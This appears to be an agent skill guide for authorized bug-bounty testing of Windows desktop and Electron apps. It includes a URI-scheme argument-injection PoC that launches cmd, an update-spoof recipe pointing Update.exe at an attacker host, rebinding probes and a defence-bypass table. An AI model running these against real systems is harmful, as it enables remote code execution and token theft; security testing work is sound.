---
name: hunt-desktop-windows
description: Hunt Windows desktop / thick-client application vulnerabilities — Electron abuse (nodeIntegration, contextIsolation=false, preload bridge flaws, ASAR extraction, ipcMain sink audit), custom URI-scheme argument injection (HKCR URL Protocol), localhost HTTP/WebSocket servers + DNS rebinding, privileged named-pipe/COM/RPC services, DLL hijacking, insecure auto-updaters (Squirrel/HTTP/unsigned), WebView2 remote-debugging ports, embedded secrets via dnSpy/decompilation, certificate-pinning bypass. Use when the target is a Windows desktop app (.exe/.msi/.msix), an Electron build, a VPN/meeting/launcher/wallet client, or a desktop app with a companion web portal.
sources: authorized-engagement
---

## Crown Jewel Targets

Desktop-app bugs pay when the trigger is **remote** (browser-delivered deep link, drive-by against a localhost server, MITM of the updater) or when the app handles high-value assets (credentials, crypto keys, corporate VPN/SSO tokens). Pure local privesc is often out of scope in web bug-bounty programs — always chain to a remote trigger or check scope.

**Highest-value targets:**

- **Electron collab/chat apps** (Slack/Teams/Discord-class) — `contextIsolation: false` + any XSS = RCE; preload bridges routinely leak `ipcRenderer` or `shell.openExternal`
- **VPN / zero-trust clients** — privileged service + named pipe + update channel; SSO token handling
- **Meeting apps** (Zoom-class) — custom URI schemes with argument injection; localhost servers
- **Game launchers / anti-cheat** — kernel-adjacent services, update mechanisms, IPC to SYSTEM
- **Crypto wallets / trading clients** — Electron + signing keys; deep links that move funds
- **Backup / sync clients** — privileged services, file-system write primitives, auth tokens on disk
- **AV / EDR / "cleaner" tools** — SYSTEM services with unauthenticated IPC; self-defense gaps

**Asset types that pay most:** one-click RCE from browser (URI scheme / XSS-in-Electron) > MITM update RCE > localhost-server drive-by (DNS rebinding) > SYSTEM privesc via named pipe (red-team scope) > credential/token theft from disk.

---

## Attack Surface Signals

**Installer / bundle signals:**
```
*.msi                          → lessmsi / msiexec /a extraction
*.msix / *.appx                → makeappx unpack; check capabilities
setup.exe (Inno Setup)         → innounp -x; [Code] section = Pascal script logic
setup.exe (NSIS)               → 7z x; $PLUGINSDIR logic
Update.exe + RELEASES + *.nupkg → Squirrel-based updater (Electron/Atom-class)
resources/app.asar             → Electron
resources/app.asar.unpacked/   → native modules shipped outside ASAR
*.exe.config / appsettings.json → .NET; decompile with dnSpy/ILSpy
WebView2Loader.dll + EBWebView/ → WebView2 app; check for --remote-debugging-port
```

**Registry signals:**
```
HKCR\<scheme>\URL Protocol     → custom URI scheme; read shell\open\command template
HKCR\CLSID\{...}\LocalServer32 → COM local servers (elevation candidates)
HKLM\...\Uninstall\<app>       → install dir, version, quiet-uninstall string
HKCU\Software\<vendor>         → stored tokens, server URLs, feature flags
```

**Runtime signals (baseline before/after launch):**
```
netstat -ano | findstr LISTENING   → new TCP listeners (note bind addr: 0.0.0.0 vs 127.0.0.1)
pipelist (Sysinternals)            → new named pipes under \\.\pipe\
Get-Service / sc query             → new services; check binPath quoting + ACLs
Process Explorer                   → loaded DLLs, handles, command lines, mitigation flags
```

---

## Step-by-Step Hunting Methodology

1. **Acquire and unpack the exact shipped build.** Record version + SHA256 (needed for the report). Extract: `msiexec /a app.msi /qn TARGETDIR=...`, `lessmsi x`, `innounp -x`, `7z x`. Inventory binaries, configs, bundled runtimes (Python/Node/Java = bigger surface).

2. **Classify the stack.** Electron (`resources/app.asar`), .NET (`*.exe.config`, `mscorlib` import), native C++ (imports, no managed metadata), WebView2, Qt (`Qt5*.dll`), Java (bundled JRE). This picks the toolchain: Electron → ASAR + JS audit; .NET → dnSpy; native → strings + x64dbg/Frida.

3. **Electron audit (highest yield).**
   - Extract: `npx asar extract resources/app.asar out/`
   - Grep `webPreferences` in main-process code for: `nodeIntegration: true`, `contextIsolation: false`, `sandbox: false`, `webSecurity: false`, `allowRunningInsecureContent: true`, `experimentalFeatures`, `enableRemoteModule`
   - Audit preload bridges: every `contextBridge.exposeInMainWorld` / direct `require('electron')` in preload is an XSS-to-RCE escalation path — check what the exposed functions can reach (`ipcRenderer.send` to privileged `ipcMain` handlers, `shell.openExternal`, `shell.openPath`, `fs`)
   - Audit `ipcMain.on/handle` handlers for command/file/URL sinks reachable from a compromised renderer
   - Check navigation guards: missing `setWindowOpenHandler` / `will-navigate` validation → open redirect into privileged window
   - Check `app.setAsDefaultProtocolClient` + second-arg handling on Windows (args arrive via `process.argv`, not the `open-url` event)

4. **Intercept traffic.** Try in order: system proxy env vars → `--proxy-server=` flag → `NODE_EXTRA_CA_CERTS` (Electron honors it) → `--ignore-certificate-errors` → Frida pinning bypass → patch the ASAR/binary. Log every endpoint; each is a pivot to the web hunt-* set (API tokens in desktop traffic are often a richer, less-hardened API surface than the web portal).

5. **Enumerate URI schemes.** For each `HKCR\<scheme>` with `URL Protocol`, read `shell\open\command`. Test argument injection from a browser page: `location.href = 'scheme://x" --injected-flag="y'`. Quote breakout, `%`-encoding tricks, trailing-space/`"` termination, and Electron flag injection (`--gpu-launcher="cmd /c calc"`-class) are the reliable paths. Check whether the app re-parses args into a shell or `Process.Start` with concatenation.

6. **Map localhost servers.** Diff `netstat -ano` before/after launch and after sign-in. For each listener:
   - Bind address `0.0.0.0` → reachable from LAN → test from a second host
   - `127.0.0.1` → test **Host-header validation** (DNS-rebinding gate): send `Host: attacker.com` — if the API still answers, a browser page on attacker.com can drive it via rebinding
   - WebSocket → check `Origin` validation (CSWSH on localhost)
   - Look for auth: token in URL, no auth at all, or auth only on "sensitive" routes. State-changing GET endpoints = trivial drive-by.

7. **Audit privileged IPC (SYSTEM services).**
   - `pipelist` + connect as a standard user: `[System.IO.Pipes.NamedPipeClientStream]` in PowerShell. If the pipe ACL allows Everyone/Users and the service parses commands → privesc.
   - Fuzz the message format (usually JSON or length-prefixed blobs); look for file-write, process-start, registry-write, and "install/update" verbs.
   - COM: enumerate elevated auto-start COM servers (`oleview`, `Get-CimInstance Win32_COMSetting`); look for interfaces callable from medium IL.
   - RPC: RpcView for interfaces without authentication callbacks.

8. **DLL / planting surface.** ProcMon filter: `Process Name is <app.exe>` + `Result is NAME NOT FOUND` + `Path ends with .dll`. Any load attempted from a user-writable dir (app dir under `%LOCALAPPDATA%`, `PATH` entries) = hijack. Also check install-dir ACLs (`icacls`) and unquoted service `binPath` with spaces.

9. **Update flow.** Capture the update check (step 4 proxy). Tests: HTTP vs HTTPS feed; signature/cert validation on the payload (flip a byte, does it still install?); feed host override via config/registry/`hosts`; version rollback (serve `1.0.0` to a `2.0.0` client); Squirrel `Update.exe --processStart` argument abuse; delta/patch application path traversal.

10. **Secrets on disk and in the binary.** Grep extracted bundle for `api[_-]?key`, `secret`, `password`, `BEGIN .*PRIVATE KEY`, connection strings, JWTS. Check `%APPDATA%` / `%LOCALAPPDATA%` / registry for stored session tokens — are they DPAPI-protected per-user, or plaintext / reversible? Plaintext SSO token on disk + any read primitive = account takeover chain.

---

## Payload & Detection Patterns

**ASAR extraction + webPreferences audit:**
```bash
npx asar extract "resources/app.asar" out
grep -rniE 'nodeIntegration|contextIsolation|sandbox|webSecurity|allowRunningInsecureContent|preload' out --include=*.js | grep -v node_modules
grep -rniE 'ipcMain\.(on|handle)|shell\.openExternal|shell\.openPath|setWindowOpenHandler|will-navigate|setAsDefaultProtocolClient' out --include=*.js
```

**Electron MITM (no repack needed):**
```powershell
$env:NODE_EXTRA_CA_CERTS="C:\tools\mitmproxy-ca.pem"
& ".\App.exe" --proxy-server=127.0.0.1:8080 --ignore-certificate-errors
```

**URI-scheme enumeration + injection probe:**
```powershell
Get-ChildItem HKCR:\ | Where-Object { Get-ItemProperty "HKCR:\$($_.PSChildName)" -Name 'URL Protocol' -ErrorAction SilentlyContinue } |
  ForEach-Object { $s=$_.PSChildName; $c=(Get-ItemProperty "HKCR:\$s\shell\open\command" -ErrorAction SilentlyContinue).'(default)'; "$s => $c" }
```
```html
<!-- PoC page: quote-breakout + Electron flag injection -->
<script>location.href = 'targetscheme://x" --gpu-launcher="cmd /c calc';</script>
```

**DNS-rebinding gate test against localhost API:**
```bash
curl -s http://127.0.0.1:PORT/api/status -H "Host: attacker.example" -o - -w '\n%{http_code}\n'
# 200 + valid body with foreign Host → no Host validation → rebinding viable
```

**Named-pipe client probe (standard user):**
```powershell
$pipe = New-Object System.IO.Pipes.NamedPipeClientStream(".", "TargetSvcPipe", [System.IO.Pipes.PipeDirection]::InOut)
$pipe.Connect(2000)   # succeeds as standard user → check what the protocol accepts
```

**DLL-hijack discovery (ProcMon):**
```
Filter: Process Name is app.exe → Include
        Result is NAME NOT FOUND → Include
        Path ends with .dll → Include
Launch app → any path under %LOCALAPPDATA%, %TEMP%, or PATH dirs = candidate
```

**Squirrel update spoof:**
```bash
# point feed at attacker host (config, registry, or hosts file), serve:
/RELEASES                      # forged manifest listing malicious .nupkg
/app-9.9.9-full.nupkg          # payload package
# then trigger: Update.exe --update=http://attacker/
# install succeeds without valid signature → RCE at next launch
```

---

## Common Root Causes

1. **`contextIsolation: false` / `nodeIntegration: true` in Electron.** Any stored/reflected XSS (chat markdown, notification, filename render) becomes RCE. The single most common Critical in desktop BB.

2. **Preload bridge over-exposure.** `contextBridge` exposing raw `ipcRenderer`, generic `invoke(channel, ...args)`, or `shell.openExternal` lets a renderer XSS reach privileged main-process sinks even with isolation enabled.

3. **URI-scheme command templates without quoting.** `shell\open\command` = `app.exe %1` (unquoted) → argument injection from any web page via `scheme://` navigation. Electron apps compound it: args land in `process.argv` and are re-parsed as Chromium switches.

4. **Localhost server with no Host/Origin validation.** Assumption that "localhost = trusted" ignores DNS rebinding and CSWSH; any website the victim visits can drive the local API.

5. **Named pipe / COM / RPC without client authentication.** SYSTEM service accepts commands from any local process; pipe ACL defaults to broad access; message handler trusts caller-supplied paths/commands.

6. **Updater without authenticode/signature enforcement, or feed over HTTP.** MITM (or compromised CDN/config) pushes a malicious package that installs silently.

7. **Writable install dir / unquoted service path / PATH-relative DLL loads.** App installed under `%LOCALAPPDATA%\Programs` + privileged sibling process = planting privesc.

8. **Secrets shipped in the bundle.** API keys, OAuth client secrets, internal endpoints in ASAR/`.exe.config`/resources — "obfuscation" treated as protection.

9. **No certificate pinning + no proxy resistance.** Desktop API traffic trivially MITM'd, exposing tokens and a softer API attack surface than the web front end.

10. **WebView2 with `--remote-debugging-port` or predictable user-data folder.** Local (or rebinding-reachable) DevTools protocol = full app control.

---

## Bypass Techniques

| Defense | Bypass |
|---|---|
| ASAR integrity check (`electron.fuses` / checksum) | Patch at runtime via `ELECTRON_RUN_AS_NODE=1` + require hook; replace ASAR in user-writable install dir; hook `Module._load` via preload |
| Certificate pinning | `NODE_EXTRA_CA_CERTS` (Electron honors it); Frida SSL-pinning bypass on native stacks; patch check in dnSpy for .NET; last resort: repatch ASAR with pinning disabled |
| `contextIsolation: true` | Attack the preload bridge: prototype pollution across the bridge, exposed generic `invoke`, DOM clobbering of bridge-read values; or find a second window with weaker `webPreferences` |
| CSP on renderer | Electron renderers frequently have no session-level CSP; check `session.defaultSession.webRequest` handlers and `<meta>` CSP absence; `file://` origin quirks |
| Host-header check on localhost server | Try `Host: localhost.attacker.com` (suffix match), `Host: 127.0.0.1.` (trailing dot), absolute-form request line, or WebSocket (Origin check may be separate/absent) |
| Pipe ACL denies standard users | Look for sibling interfaces: COM elevation, ALPC ports, RPC endpoints, or a second pipe with weaker ACL; check for "repair/update" verbs on user-reachable pipes that reach SYSTEM file ops |
| Signed updates | Test rollback/downgrade (signature valid, version old + vulnerable), delta-apply path traversal, feed-URL override via config/registry, or `Update.exe` argument injection |
| DPAPI-protected tokens on disk | Check scope: `LocalMachine` scope = any local user decrypts; look for apps shipping their own "encryption" with a hardcoded key instead |
| SmartScreen / Mark-of-the-Web on PoC | Deep-link and rebinding vectors don't carry MOTW; only dropped payloads do — note it in the report but don't treat as a fix |

---

## Gate 0 Validation

Before writing the report, confirm:

1. **What is the remote trigger?** Desktop BB programs usually require a remote vector. Rank: browser-navigable deep link → RCE (Critical) > drive-by on localhost API via rebinding (High) > MITM update (High-Critical, needs network position) > local privesc (often out of scope — check the brief) > plaintext token on disk (needs a read primitive to matter).

2. **Have you reproduced end-to-end on a clean VM?** Fresh OS install + exact installer version (record SHA256) + default settings. If the PoC needs a non-default flag/config, severity drops — say so.

3. **Can a triager reproduce in <10 min?** Provide: installer version/hash, OS build, the PoC HTML page (deep link or rebinding), exact pipe/endpoint request, and expected vs actual result. For Electron chains, include the extracted `webPreferences` block and the XSS sink.

4. **Cross-reference `triage-validation`.** "Primitive confirmed" (pipe connects, scheme registered, feed is HTTP) is not impact — the chain must end in attacker-attainable effect before claiming Critical.

---

## Real Impact Examples

### Scenario A — Electron collab app: contextIsolation=false + markdown XSS → RCE

Extracted ASAR shows `webPreferences: { contextIsolation: false, nodeIntegration: false }` and a preload doing `window.require = require`. A stored XSS in the team-chat markdown renderer (missing sanitize on `<img onerror>`) executes `require('child_process').exec(...)` in the renderer. Reported severity: **Critical** (any message recipient is compromised; wormable via self-sending).

### Scenario B — VPN client URI scheme argument injection → one-click RCE

`HKCR\myvpn\shell\open\command` = `"C:\Program Files\MyVPN\myvpn.exe" %1` (unquoted). PoC page navigates to `myvpn://connect" --gpu-launcher="cmd /c powershell -c ...` (Electron-based client re-parses argv as Chromium switches). Visiting the page with one confirmation dialog (custom-scheme prompt) launches attacker code. Reported severity: **Critical**.

### Scenario C — meeting-app localhost API without Host validation → drive-by settings change

Client signs in → local API on `127.0.0.1:19324` answers with any `Host` header. Rebinding PoC page reads `/config` (leaks meeting tokens) and POSTs `/config` to disable update checks + change the update server. Reported severity: **High**.

### Scenario D — Squirrel updater over HTTP → MITM RCE

`Update.exe --update=` fetches `http://updates.vendor.example/RELEASES` (HTTP, and payload signature not enforced for delta packages). On a hostile network, forged `RELEASES` + `.nupkg` installs and executes at next launch. Reported severity: **High** (network-position requirement keeps it below Critical).

---

## Related Skills & Chains

- **`hunt-desktop-macos`** — Sibling skill; Electron/root-cause classes (isolation, preload, updater, deep links) transfer directly. Chain primitive: same vendor ships both builds → findings in one build's config almost always exist in the other.
- **`hunt-xss`** — Electron XSS is the entry primitive for the most common Critical chain. Chain primitive: any stored/reflected XSS in a renderer + `contextIsolation: false` or over-exposed preload bridge → `require('child_process')` → RCE (`hunt-rce`).
- **`hunt-websocket`** — Localhost WebSocket bridges without `Origin` validation = CSWSH against the desktop client. Chain primitive: `ws://127.0.0.1:*` listener + no Origin check → browser page drives client API.
- **`hunt-cors`** / **`hunt-host-header`** — Localhost HTTP APIs fail Host/Origin validation the same way web apps fail CORS. Chain primitive: permissive `Access-Control-Allow-Origin` on `127.0.0.1` API → no rebinding even needed, direct `fetch` from any origin.
- **`hunt-source-leak`** — Extracted ASAR/decompiled .NET is a source leak: mine it for endpoints, keys, and feature flags, then pivot findings to the web hunt-* set against the companion API.
- **`hunt-rce`** — Terminal skill for every chain above; provides gadget/payload detail once a command-injection or deserialization sink is confirmed in a privileged service.
- **`triage-validation`** — Run the 7-Question Gate before submission; desktop findings inflate easily ("pipe connects" ≠ privesc) and get bounced without a full chain.
- **`evidence-hygiene`** / **`report-writing`** — Deep-link and token PoCs leak real session material; redact per evidence-hygiene, format per report-writing.
